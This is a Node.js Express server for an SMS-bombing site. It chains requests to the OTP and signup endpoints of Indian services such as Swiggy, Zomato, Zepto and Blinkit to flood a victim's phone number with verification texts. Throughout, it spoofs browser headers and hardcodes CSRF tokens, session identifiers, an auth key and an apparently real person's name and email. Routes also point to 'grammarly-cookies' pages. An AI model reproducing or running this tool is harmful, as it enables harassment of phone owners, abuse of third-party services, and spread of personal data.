// server.js

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = 3000;

app.use(bodyParser.json());

// Serve static files (Bootstrap CSS)
app.use(express.static('public'));

// API configurations
const apiConfigurations = {
    guarented: {
        url: 'https://prod-be.guarented.com/send-otp',
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://www.guarented.com',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
        },
        payloadKey: 'phone',
    },
    swiggy: {
        url: 'https://www.swiggy.com/dapi/auth/sms-otp',
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://www.swiggy.com',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        },
        payloadKey: 'mobile',
        additionalPayload: {
            _csrf: 'X6QUZqyxZ7y9-d2fLuRXAOmkjVo432VsT9gruJ0c',
        },
    },
    zomato: {
        url: 'https://accounts.zomato.com/login/phone',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://accounts.zomato.com',
            'Referer': 'https://accounts.zomato.com/zoauth/login?login_challenge=248874bba2644d5a87ad1b7fad1de15e',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'x-zomato-csrft': '', // Replace with the actual CSRF token
        },
        payloadKey: 'number',
        additionalPayload: {
            country_id: '1',
            type: 'initiate',
            csrf_token: '9eb68c15b9fc972765ee04219fb675c2',
            lc: '248874bba2644d5a87ad1b7fad1de15e',
            verification_type: 'sms',
        },
    },
    confirmtkt: {
        url: 'https://securedapi.confirmtkt.com/api/platform/register',
        method: 'GET',
        payloadKey: 'mobileNumber',
        additionalPayload: {
            newOtp: "true",
        },
        identifier: 'false',
    },
    swiggysignup: {
        url: 'https://www.swiggy.com/dapi/auth/signup',
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://www.swiggy.com',
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
        },
        payloadKey: 'mobile',
        additionalPayload: {
            name: "sumit",
            email: "sumit895626@gmail.com",
            referral: "",
            otp: "",
            _csrf: "YCd9XLCHF9s0-ockyupbJbvZqNhnBrIqdLPnZDFY",
        },
    },
    zepto: {
        url: 'https://api.zepto.co.in/api/v1/user/customer/send-otp-sms/',
        headers: {
            'Content-Type': 'application/json; charset=utf-8',
            'Referer': 'https://www.zeptonow.com/',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'X-Requested-With': 'XMLHttpRequest',
            'requestId': '6704910682711572',
            'sessionId': '4384783635241841',
            'appVersion': '7.0.2-WEB',
            'bundleVersion': 'v1',
            'platform': 'WEB',
            'compatible_components': 'CONVENIENCE_FEE,NEW_FEE_STRUCTURE',
            'deviceId': '3034202986321597',
            'Origin': 'https://www.zeptonow.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'deviceUID': '',
            'systemVersion': ''
        },
        payloadKey: 'mobileNumber'
    },
    blinkit: {
        url: 'https://blinkit.com/v2/accounts/',
        headers: {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://blinkit.com/',
            'auth_key': 'c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477',
            'app_client': 'consumer_web',
            'rn_bundle_version': '1009003012',
            'app_version': '52434332',
            'web_app_version': '1008010012',
            'session_uuid': '48a03c8e-fa7d-4d38-988d-862d7a7e2827',
            'device_id': 'e47066bd-6a3d-4ce6-8bfb-41caf3c1a80a'
        },
        payloadKey: 'user_phone'
    }
};

let otpInProgress = false;

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/send-otp/:apiName', async (req, res) => {
    const apiName = req.params.apiName;
    const { [apiConfigurations[apiName].payloadKey]: requestData } = req.body;
    const phone = req.body.phoneNumber;

    if (!requestData) {
        return res.status(400).json({ error: 'Data is required' });
    }

    try {
        // Check if OTP is already in progress
        if (otpInProgress) {
            return res.status(400).json({ error: 'OTP is already in progress. Wait for the current process to complete.' });
        }

        // Set OTP in progress to true
        otpInProgress = true;

        // Asynchronous function to handle OTP sending logic
        const sendOtp = async () => {
            try {
                // Send OTP from Guarented
                const responseGuarented = await axios.post(apiConfigurations.guarented.url, { [apiConfigurations.guarented.payloadKey]: requestData }, {
                    headers: apiConfigurations.guarented.headers,
                });

                // If Guarented OTP send is successful, wait for 10 seconds and send OTP from Swiggy
                if (responseGuarented.status === 200) {
                    await delay(10000); // 10 seconds delay
                    const responseSwiggy = await axios.post(apiConfigurations.swiggy.url, {
                        [apiConfigurations.swiggy.payloadKey]: requestData,
                        ...apiConfigurations.swiggy.additionalPayload,
                    }, {
                        headers: apiConfigurations.swiggy.headers,
                    });

                    // If Swiggy OTP send is successful, wait for 10 seconds and send OTP from Zomato
                    if (responseSwiggy.status === 200) {
                        await delay(10000); // 10 seconds delay
                        const responseZomato = await axios.post(
                            apiConfigurations.zomato.url,
                            new URLSearchParams({
                                [apiConfigurations.zomato.payloadKey]: requestData,
                                ...apiConfigurations.zomato.additionalPayload,
                            }),
                            {
                                headers: apiConfigurations.zomato.headers,
                            }
                        );

                        // If Zomato OTP send is successful, wait for 10 seconds and send OTP from Confirmtkt
                        if (responseZomato.status === 200) {
                            await delay(10000); // 10 seconds delay

                            const responseConfirmtkt = await axios.get(apiConfigurations.confirmtkt.url, {
                                params: {
                                    [apiConfigurations.confirmtkt.payloadKey]: requestData,
                                    ...apiConfigurations.confirmtkt.additionalPayload,
                                },
                            });

                            // If Confirmtkt OTP send is successful, wait for 10 seconds and send OTP from Swiggysignup
                            if (responseConfirmtkt.status === 200) {
                                await delay(10000); // 10 seconds delay

                                // After sending OTP through swiggysignup, add logic for hoichoitv
                                const responseSwiggysignup = await axios.post(apiConfigurations.swiggysignup.url, {
                                    [apiConfigurations.swiggysignup.payloadKey]: requestData,
                                    ...apiConfigurations.swiggysignup.additionalPayload,
                                }, {
                                    headers: apiConfigurations.swiggysignup.headers,
                                });

                                // Check if Swiggysignup OTP send is successful
                                if (responseSwiggysignup.status === 200) {
                                    await delay(10000); // 10 seconds delay

                                    const responseZepto = await axios.post(apiConfigurations.zepto.url, {
                                        [apiConfigurations.zepto.payloadKey]: requestData,
                                    }, {
                                        headers: apiConfigurations.zepto.headers,
                                    });

                                    // Check if Swiggysignup OTP send is successful
                                if (responseZepto.status === 200) {
                                    await delay(10000); // 10 seconds delay

                                    const responseBlinkit = await axios.post(apiConfigurations.blinkit.url, {
                                        [apiConfigurations.blinkit.payloadKey]: requestData,
                                    }, {
                                        headers: apiConfigurations.blinkit.headers,
                                    });

                                    // Check if hoichoitv OTP send is successful
                                    if (responseBlinkit.status === 200) {
                                        res.json({
                                            message: 'Swiggysignup OTP sent successfully. zepto OTP will be sent after a 10-second delay. blinkit otp will be sent after a 10-second delay.',
                                            swiggysignupResponse: responseSwiggysignup.data,
                                            zeptoResponse: responseZepto.data,
                                            blinkitResponse: responseBlinkit.data,
                                        });
                                    } else {
                                        res.status(500).json({ error: 'Failed to send blinkit OTP' });
                                    }
                                    } else {
                                        res.status(500).json({ error: 'Failed to send zepto OTP' });
                                    }
                                } else {
                                    res.status(500).json({ error: 'Failed to send Swiggysignup OTP' });
                                }

                            } else {
                                res.status(500).json({ error: 'Failed to send Confirmtkt OTP' });
                            }
                        } else {
                            res.status(500).json({ error: 'Failed to send Zomato OTP' });
                        }
                    } else {
                        res.status(500).json({ error: 'Failed to send Swiggy OTP' });
                    }
                } else {
                    res.status(500).json({ error: 'Failed to send Guarented OTP' });
                }
            } catch (error) {
                console.error(`Error sending OTP from ${apiName}:`, error.response ? error.response.data : error.message);
                res.status(500).json({ error: `Failed to send OTP from ${apiName}` });
            } finally {
                // Set OTP in progress to false after completing the process
                otpInProgress = false;
            }
        };

        // Call the asynchronous function immediately
        await sendOtp();
    } catch (error) {
        console.error(`Error in /send-otp/:apiName:`, error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/stop-otp', (req, res) => {
    // Add logic to stop OTP if needed
    otpInProgress = false; // Set OTP in progress to false
    // Send a response indicating success
    res.json({ success: true, message: 'OTP stopped successfully' });
});

// Set up a route for the "aboutus.html" page
app.get('/Home', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Set up a route for the "aboutus.html" page
app.get('/aboutus', (req, res) => {
    res.sendFile(__dirname + '/public/about.html');
});


// setuo route for the contactus page
app.get('/contact', (req, res) => {
    res.sendFile(__dirname + '/public/contact.html');
});

// setuo route for the protect page
app.get('/Protect', (req, res) => {
    res.sendFile(__dirname + '/public/protect.html');
});

// setuo route for the privacy page
app.get('/Privacy', (req, res) => {
    res.sendFile(__dirname + '/public/privacy.html');
});

// setuo route for the terms page
app.get('/Terms', (req, res) => {
    res.sendFile(__dirname + '/public/terms.html');
});

// setuo route for the bomberstart page
app.get('/Bomberstart', (req, res) => {
    res.sendFile(__dirname + '/public/bomberstart.html');
});

// setuo route for the numberlookup page
app.get('/number-lookup', (req, res) => {
    res.sendFile(__dirname + '/public/number-lookup.html');
});

// setuo route for the sms bomber page
app.get('/sms-bomber', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// setuo route for the blog page
app.get('/blogs', (req, res) => {
    res.sendFile(__dirname + '/public/blog.html');
});

// setuo route for the single page
app.get('/grammarly-cookies/', (req, res) => {
    res.sendFile(__dirname + '/public/singlepage/grammarly-cookies.html');
});

// setuo route for the cookies page
app.get('/grammarly-1-get/', (req, res) => {
    res.sendFile(__dirname + '/public/cookiespages/grammarly-1-h.html');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
